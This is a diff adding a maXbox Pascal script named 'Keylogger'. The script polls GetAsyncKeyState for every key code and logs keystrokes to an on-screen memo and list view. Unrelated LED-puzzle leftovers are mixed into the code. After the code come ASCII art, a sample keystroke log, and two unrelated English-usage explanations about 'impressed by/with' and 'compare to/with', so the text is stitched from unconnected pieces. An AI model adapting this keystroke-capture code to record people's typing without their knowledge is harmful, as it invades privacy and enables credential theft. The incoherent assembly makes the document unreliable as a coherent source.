@@ -1,0 +1,251 @@
+program Keylogger;
+
+//*********************************************************************
+// gets keys with  getasynckeystate  #locs=212
+// first you define a size und pattern (word) and alter the pattern with
+// the function letShowVerify(); 
+// task: set the last stone from blue to alter color!
+//*********************************************************************
+
+var
+  ppForm: TForm;
+  pattern1: string;
+  labelList: TStringList;
+  psize: integer;
+  S_logstop: boolean;
+
+procedure letShowVerify;
+var
+  i: integer;
+  o: TLabel;
+begin
+  for i:= 1 to psize do begin
+    o:= TLabel(labelList.objects[i-1]);
+    //o.caption:= inttostr(i);
+    if i < length(pattern1) then 
+      if pattern1[i] = '1' then o.color:= random(clwhite);
+  end;
+  application.ProcessMessages;
+  //if (nbok=psize) then  showMessage('***Congratulate***'#13#10+
+  //                                   'You win with maXbox Delphi!');
+end;
+
+
+procedure randomLED;
+var i: byte;
+begin
+  pattern1:= '';
+  for i:= 1 to psize  do
+    pattern1:= pattern1 + chr(random(2)+48);
+  //test string on memo
+  writeln(pattern1)
+end;  
+
+
+procedure Label1Click(Sender: TObject);
+var i: byte;
+begin
+  randomseed;
+  for i:= 1 to 70 do begin
+    randomLED;
+    letShowVerify();
+  end
+  //ppform.caption.savetofile
+  //SaveCanvas2(ppform.Canvas, Exepath+'SAVEPATHRichter);
+  //sleep(10)
+end;
+
+procedure Label1ClickSave(Sender: TObject);
+var i: byte;
+begin
+  //ppform.caption.savetofile
+  SaveCanvas2(ppform.Canvas, Exepath+'SAVEPATHRichter.png');
+  opendoc(Exepath+'SAVEPATHRichter.png');
+  //sleep(10)
+end;
+
+
+procedure loadPForm(vx, vy: integer);
+begin
+  psize:= vx*vy
+  //constructor
+  ppform:= Tform.create(self);
+  with ppform do begin
+    caption:= 'this is LED maXland, please click...';  
+    width:= (vx*psize)+ 10;
+    height:= (vy*psize)+ 30;
+    BorderStyle:= bsDialog;
+    Position:= poScreenCenter;
+    OnDblClick:= @Label1ClickSave;
+    show;
+  end  
+end;
+
+
+procedure deSolver;
+var i: integer;
+begin
+  //moveStone(TLabel(labellist.objects[4]));
+  //moveStone(TLabel(labellist.objects[7]));
+  //to demonstrate and destroy the objects on the list
+  for i:= 0 to 8-1 do begin
+    sleep(400)
+    application.processMessages;
+    TLabel(labelList.objects[i]).free
+  end
+end;
+
+procedure Send(x : string);
+begin
+ Memo2.Lines.Add(x)
+end;
+
+
+procedure TForm1_Timer1Timer(Sender: TObject);
+//begin
+//if GetAsyncKeyState(Ord('A'))= -32767  then send('A');
+//if GetAsyncKeyState(Ord('B'))= -32767  then send('B');
+var X,y:integer;
+   f:char;
+   listview1: TListview;
+begin
+For X:=0 to 255 do begin
+  if ((GetAsyncKeyState($+x) and 1) = 1) then  begin
+  if (x<>1) then //if we want to find the ascii code instead:
+  begin
+    MEMO2.Lines.Add(inttostr(x)+'$·%&');
+  end;
+    for y:=0 to listview1.items.Count-1 do //log the key strokes
+      begin
+       if x=strtoint(listview1.items.item[y].caption) then
+       memo2.text:= memo2.Text + (listview1.items.item[y].subitems[0])
+     end;
+   end;
+end;
+end;
+
+var cfrm: TForm;
+    listview1: TListview;
+
+procedure TForm1_CloseBtnClick(Sender: TObject);
+begin
+  S_logstop:= true;
+  writeln('key log stopped');
+  cfrm.close;
+end;
+
+procedure LoadForm;
+begin
+  cFrm:= TForm.create(self);
+  S_logstop:= false;
+  try
+    with cFrm do begin
+      caption:= '((((TARTARUGA PENTA KeyLog))))';  
+      height:= 600;
+      width:= 600;
+      color:= clNavy;
+      Position:= poScreenCenter;
+      show;
+    end;
+    listview1:= TListview.create(self);
+    with listview1 do begin
+      parent:= cfrm;
+      setbounds(20,50,500,400)
+      Font.Size:= 14;
+      //Canvas.Font.Size:= 14;
+      show;
+    end;
+  with TBItbtn.create(cfrm) do begin
+    parent:= cfrm;
+    SetBounds(260,470,290,70)
+    Font.size:= 14;
+    Caption:= '&Stop Log'
+    glyph.LoadFromResourceName(HINSTANCE,'MOON_64');
+    TabOrder:= 0
+    OnClick:= @TForm1_CloseBtnClick;
+  end;
+   except
+    Exit;
+  end  
+end;
+
+
+procedure keyLogAsync;
+//begin
+//if GetAsyncKeyState(Ord('A'))= -32767  then send('A');
+//if GetAsyncKeyState(Ord('B'))= -32767  then send('B');
+var X,y:integer;
+   f:char;
+   str:string;
+begin
+For X:=0 to 255 do begin
+  if ((GetAsyncKeyState($+x) And 1) = 1) then  begin
+  if (x<>1) then //if we want to find the ascii code instead:
+  begin
+    //ListView1.Items.Add;
+    MEMO2.Lines.Add('keylog '+inttostr(x)+'$·%&: '+chr(x));
+    listview1.additem(chr(x),self)
+     //listview1.items.item[x].add(inttostr(x))
+  end;
+    {for y:=0 to listview1.items.Count-1 do //log the key strokes
+      begin
+       if x=strtoint(listview1.items.item[y].caption) then
+       memo2.text:= memo2.Text + (listview1.items.item[y].subitems[0])
+     end;  }
+ end;
+end;
+end;
+
+//main of LED
+begin
+//**************************** OOP in maXbox *******************************
+//sizex, sizey as paras()
+  //loadPForm(10,8);
+  //initPuzzle(10);
+  //deSolver()
+  loadForm;
+  repeat 
+    keyLogAsync;
+    sleep(200)
+  until S_logstop; //isKeypressed;
+  
+end.
+         ____    ___   _      ____    _   _   _
+        |  _ \  |  _| | |    |  _ \  | | | | | |
+        | | . | | |_  | |    | |_| | | |_| | | |
+        | | | | |  _| | |    |  __/  |  _  | | |          
+        | |_. | | |_  | |__  | |     | | | | | |
+        |____/  |___| |____| |_|     |_| |_| |_| 
+          
+
+ref:
+
+keylog 55$·%&: 7
+keylog 56$·%&: 8
+keylog 57$·%&: 9
+keylog 32$·%&:  
+keylog 17$·%&: 
+keylog 18$·%&: 
+keylog 162$·%&: ¢
+keylog 165$·%&: ¥
+keylog 18$·%&: 
+keylog 164$·%&: ¤
+key log stopped
+
+
+          "Impressed by" is used to express amazement for a person's doing or deed. "Impressed with" is used to express the same sentiments to the output or deed of a person. For example, "I'm impressed by your husbands honesty when he told you he dated thrice during your marriage." This statement is directed to the person himself. However, when you say, "I'm very impressed with his ability to meet deadlines without sacrificing the quality of the job.", it is more concerned on what the subject of the sentence is bound to produce or the ability of the person to produce quality output amidst extreme circumstance.
+
+I hope it helps!!!
+
+ Compare to and compare with are both correct usages, but they have slightly different meanings. What you intend to say will determine which you should use.
+
+ Compare with = "to place side by side, noting the differences and similarities between."
+
+Compare to = "to observe or point only to likenesses between."
+
+Garner's Modern Americn Usage (3rd edition, 2009, Oxford University Press) offers these examples to illustrate the difference:
+
+"Let us compare his goals with his actual achievements."
+
+"He compared her eyes to limpid pools."
+
